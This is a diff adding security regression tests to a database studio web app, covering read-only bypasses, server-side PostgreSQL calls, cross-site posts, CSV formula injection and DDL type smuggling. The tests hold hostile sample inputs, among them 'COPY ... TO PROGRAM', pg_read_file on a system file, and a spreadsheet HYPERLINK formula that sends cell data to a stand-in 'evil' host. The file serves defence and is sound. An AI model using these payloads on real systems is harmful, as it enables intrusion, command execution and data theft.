@@ -1,3 +1,5 @@
+import csv
+import io
 from collections.abc import Iterator
 from pathlib import Path
 from typing import Any
@@ -397,3 +399,127 @@ def test_ddl_preview_works_but_apply_is_blocked_read_only(
     with make_client(pg_url, read_only=True) as client:
         assert client.post(DDL_PREVIEW, json=op, headers=AUTH).status_code == 200
         assert client.post(DDL_APPLY, json=op, headers=AUTH).status_code == 403
+
+
+def test_read_only_refuses_transaction_control(pg_url: str, driver: PostgresDriver) -> None:
+    # SS1: a COMMIT / ROLLBACK / SET in the middle of a batch used to end the READ ONLY
+    # transaction, so the statements after it ran read-write.
+    with make_client(pg_url) as writable:  # seed outside read-only: it refuses writes
+        writable.post(ROWS, json={"values": {"email": "victim"}}, headers=AUTH)
+    with make_client(pg_url, read_only=True) as client:
+        for sql in (
+            "select 1; commit; insert into users (email) values ('x')",
+            "set transaction_read_only = off; insert into users (email) values ('x')",
+            "rollback; begin; insert into users (email) values ('x'); commit",
+            "savepoint s; insert into users (email) values ('x')",
+            "/* a comment */ commit",
+        ):
+            response = client.post("/api/sql", json={"sql": sql}, headers=AUTH)
+            assert response.status_code == 403, (sql, response.text)
+        emails = client.post(
+            "/api/sql", json={"sql": "select email from users order by id"}, headers=AUTH
+        ).json()["rows"]
+        assert emails == [["victim"]]
+
+
+def test_read_only_refuses_server_side_calls(pg_url: str, driver: PostgresDriver) -> None:
+    # SS2: READ ONLY does not stop a superuser from acting outside the transaction.
+    with make_client(pg_url, read_only=True) as client:
+        for sql in (
+            "select pg_read_file('/etc/hostname')",
+            "select pg_terminate_backend(1)",
+            "copy (select 1) to program 'true'",
+            "do $$ begin end $$",
+            "notify chan",
+        ):
+            response = client.post("/api/sql", json={"sql": sql}, headers=AUTH)
+            assert response.status_code == 403, (sql, response.text)
+
+
+def test_cross_site_post_is_refused(pg_url: str, driver: PostgresDriver) -> None:
+    # SS3: browsers attach cached Basic credentials to a cross-site form post.
+    with make_client(pg_url, basic_auth=("admin", "pw")) as client:
+        basic = {"Authorization": _basic_credentials("admin", "pw").decode()}
+        ok = client.post("/api/sql", json={"sql": "select 1"}, headers=basic)
+        assert ok.status_code == 200
+        cross = client.post(
+            "/api/sql",
+            json={"sql": "select 1"},
+            headers={**basic, "Origin": "https://evil.example"},
+        )
+        assert cross.status_code == 403
+        site = client.post(
+            "/api/sql",
+            json={"sql": "select 1"},
+            headers={**basic, "Sec-Fetch-Site": "cross-site"},
+        )
+        assert site.status_code == 403
+        form = client.post(
+            "/api/sql",
+            content='{"sql": "select 1"}',
+            headers={**basic, "Content-Type": "text/plain"},
+        )
+        assert form.status_code == 415
+
+
+def test_error_responses_keep_the_security_headers(pg_url: str, driver: PostgresDriver) -> None:
+    # SS4: a 401 never reached call_next, so it skipped CSP and friends.
+    with make_client(pg_url) as client:
+        response = client.get("/api/meta")
+        assert response.status_code == 401
+        assert response.headers["x-frame-options"] == "DENY"
+        assert "default-src 'self'" in response.headers["content-security-policy"]
+
+
+def test_csv_export_neutralizes_formulas(client: TestClient) -> None:
+    # SS5: a cell starting with =, +, - or @ runs as a formula in a spreadsheet.
+    client.post(
+        ROWS, json={"values": {"email": '=HYPERLINK("http://evil/?"&A1,"x")'}}, headers=AUTH
+    )
+    client.post(ROWS, json={"values": {"email": "+1+cmd"}}, headers=AUTH)
+    client.post(ROWS, json={"values": {"email": "@SUM(1)"}}, headers=AUTH)
+    text = client.get(EXPORT, params={"format": "csv"}, headers=AUTH).text
+    rows = list(csv.reader(io.StringIO(text)))
+    assert [row[1] for row in rows[1:]] == [
+        "'=HYPERLINK(\"http://evil/?\"&A1,\"x\")",
+        "'+1+cmd",
+        "'@SUM(1)",
+    ]
+    # JSON is typed data, not a spreadsheet cell: it is left alone.
+    js = client.get(EXPORT, params={"format": "json"}, headers=AUTH).json()
+    assert js[0]["email"].startswith("=")
+
+
+def test_ddl_is_limited_to_the_configured_schemas(pg_url: str, driver: PostgresDriver) -> None:
+    # SF2: information_schema is a plain identifier, so only the schema filter stops it.
+    with make_client(pg_url) as client:
+        response = client.post(
+            "/api/ddl/preview",
+            json={
+                "operation": "create_table",
+                "schema": "information_schema",
+                "name": "sneaky",
+                "columns": [{"name": "id", "type": "integer"}],
+            },
+            headers=AUTH,
+        )
+        assert response.status_code == 403
+        assert "schema filter" in response.json()["error"]
+
+
+def test_ddl_type_allow_list_rejects_constraint_clauses(
+    pg_url: str, driver: PostgresDriver
+) -> None:
+    # SF1: "int references victim on delete cascade" used to be a valid type.
+    import mizzle.studio.ddl as ddl
+
+    for bad in (
+        "int references victim on delete cascade",
+        "int primary key",
+        "int unique",
+        "int generated always as identity",
+    ):
+        assert not ddl._TYPE.fullmatch(bad), bad
+    for good in ("integer", "varchar(255)", "numeric(10,2)", "timestamp with time zone"):
+        assert ddl._TYPE.fullmatch(good), good
+    assert not ddl._DEFAULT.fullmatch("0::int unique")
